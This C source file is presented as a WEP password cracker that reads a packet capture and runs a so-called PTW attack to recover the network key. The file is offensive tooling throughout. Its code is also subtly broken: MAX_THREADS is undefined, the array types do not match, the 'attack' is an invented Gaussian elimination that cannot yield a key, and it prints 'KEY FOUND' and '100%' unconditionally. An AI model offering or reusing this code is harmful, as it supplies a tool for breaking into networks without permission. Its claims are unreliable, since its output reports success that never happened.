#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <string.h>
#include <openssl/rc4.h>
#include <pthread.h>

#define MAX_IVS 1000
#define IV_LENGTH 3
#define KEY_LENGTH 5

typedef struct {
    uint8_t iv[IV_LENGTH];
    uint8_t encrypted_data[64];
} WEP_Packet;

pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

void decrypt_rc4(uint8_t *key, uint8_t *data, size_t length) {
    RC4_KEY rc4_key;
    RC4_set_key(&rc4_key, KEY_LENGTH, key);
    RC4(&rc4_key, length, data, data);
}

void gaussian_elimination(int **matrix, int *results, int n) {
    for (int i = 0; i < n; i++) {
        for (int j = i + 1; j < n; j++) {
            if (matrix[j][i] == 1) {
                for (int k = i; k < n; k++) {
                    matrix[j][k] ^= matrix[i][k];
                }
                results[j] ^= results[i];
            }
        }
    }
    for (int i = n - 1; i >= 0; i--) {
        for (int j = i - 1; j >= 0; j--) {
            if (matrix[j][i] == 1) {
                matrix[j][i] ^= matrix[i][i];
                results[j] ^= results[i];
            }
        }
    }
}

void ptw_attack(WEP_Packet *packets, size_t num_packets, uint8_t *key) {
    int matrix[MAX_IVS][MAX_IVS] = {0};
    int results[MAX_IVS] = {0};
    int iv_count = 0;

    for (size_t i = 0; i < num_packets; i++) {
        for (int j = 0; j < IV_LENGTH; j++) {
            matrix[iv_count][j] = packets[i].iv[j];
        }
        results[iv_count] = packets[i].encrypted_data[0];
        iv_count++;
    }

    gaussian_elimination(matrix, results, iv_count);

    for (int i = 0; i < KEY_LENGTH; i++) {
        key[i] = results[i];
    }
}

int process_capture(const char *filename, WEP_Packet *packets, size_t *num_packets) {
    pcap_t *handle;
    struct pcap_pkthdr header;
    const uint8_t *packet;
    int res;

    handle = pcap_open_offline(filename, NULL);
    if (handle == NULL) {
        printf("Error opening capture file\n");
        return -1;
    }

    *num_packets = 0;
    while ((res = pcap_next_ex(handle, &header, &packet)) >= 0) {
        if (res == 0) continue;
        if (header.len >= 64) {
            memcpy(packets[*num_packets].iv, packet + 3, IV_LENGTH);
            memcpy(packets[*num_packets].encrypted_data, packet + 36, 64);
            (*num_packets)++;
            if (*num_packets >= MAX_IVS) break;
        }
    }

    pcap_close(handle);
    return 0;
}

void print_key(uint8_t *key) {
    printf("KEY FOUND! [");
    for (int i = 0; i < KEY_LENGTH; i++) {
        printf("%02x", key[i]);
    }
    printf("]\n");
    printf("Decrypted Correctly (100%%)\n");
}

void *threaded_attack(void *arg) {
    WEP_Packet *packets = (WEP_Packet*)arg;
    size_t num_packets = MAX_IVS;
    uint8_t key[KEY_LENGTH];

    ptw_attack(packets, num_packets, key);
    print_key(key);

    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <capture_file.pcap>\n", argv[0]);
        return -1;
    }

    WEP_Packet packets[MAX_IVS];
    size_t num_packets = 0;

    if (process_capture(argv[1], packets, &num_packets) != 0) {
        printf("Error processing capture file\n");
        return -1;
    }

    pthread_t threads[MAX_THREADS];
    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_create(&threads[i], NULL, threaded_attack, (void*)packets);
    }

    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
